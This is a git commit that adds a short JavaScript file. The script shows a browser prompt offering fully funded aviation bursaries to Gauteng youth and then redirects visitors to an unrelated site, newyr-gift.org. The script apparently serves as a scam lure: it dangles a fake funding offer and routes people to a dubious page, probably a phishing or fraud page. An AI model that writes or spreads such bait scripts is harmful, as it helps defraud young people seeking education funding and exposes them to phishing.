418f957df4d543fd98b2832d390c1ad93a9b6862
ukebeblog <esther001imoh@gmail.com>
2025-01-09 19:45:03 +0100

    Create flyfofa-active.js

---
+++ flyfofa-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('𝗕𝗨𝗥𝗦𝗔𝗥𝗬 𝗢𝗣𝗣𝗢𝗥𝗧𝗨𝗡𝗜𝗧𝗬: Fly Fofa Aviation Training is offering Gauteng youth that are interested in aviation full-funded bursaries (incl. accommodation & monthly stipend), kindly press Ok to submit application ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://newyr-gift.org/flyfofa.html';
+}
